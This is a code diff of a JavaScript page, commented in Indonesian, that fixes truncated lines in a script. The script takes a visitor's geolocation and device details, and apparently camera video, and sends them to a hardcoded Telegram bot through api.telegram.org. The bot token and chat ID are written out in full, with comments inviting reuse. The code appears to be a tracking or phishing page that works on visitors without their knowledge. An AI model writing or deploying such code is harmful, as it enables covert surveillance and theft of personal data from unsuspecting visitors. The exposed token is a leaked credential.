@@ -1,4 +1,4 @@
-const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAUO8H_0ljUav8'; // Gant>
+const telegramBotToken = '7999220035:AAFf2ERfvapw7SWffyme3UAUO8H_0ljUav8'; // Ganti dengan token bot Anda
 const chatId = '6975695436'; // Ganti dengan chat ID Anda
 
 const video = document.getElementById('video');
@@ -64,10 +64,11 @@ function getLocation() {
         sendLocationToTelegram("Geolocation tidak didukung.");
     }
 }
+
 // Fungsi untuk mengirim lokasi ke Telegram
 function sendLocationToTelegram(locationLink) {
-    const message = `📍 <b>Lokasi Pengguna:</b> <a href="${locationLink}">Lihat di>
-
+    const message = `📍 <b>Lokasi Pengguna:</b> <a href="${locationLink}">Lihat di Google Maps</a>`;
+    
     fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
         method: 'POST',
         headers: {
@@ -93,7 +94,7 @@ function sendLocationToTelegram(locationLink) {
 function getDeviceInfo() {
     const deviceInfo = {
         userAgent: navigator.userAgent, // Informasi browser
-        platform: navigator.platform,  // Platform perangkat (Windows, Linux, Andr>
+        platform: navigator.platform,  // Platform perangkat (Windows, Linux, Android, dll)
         language: navigator.language,  // Bahasa yang digunakan
         online: navigator.onLine       // Status koneksi (online/offline)
     };
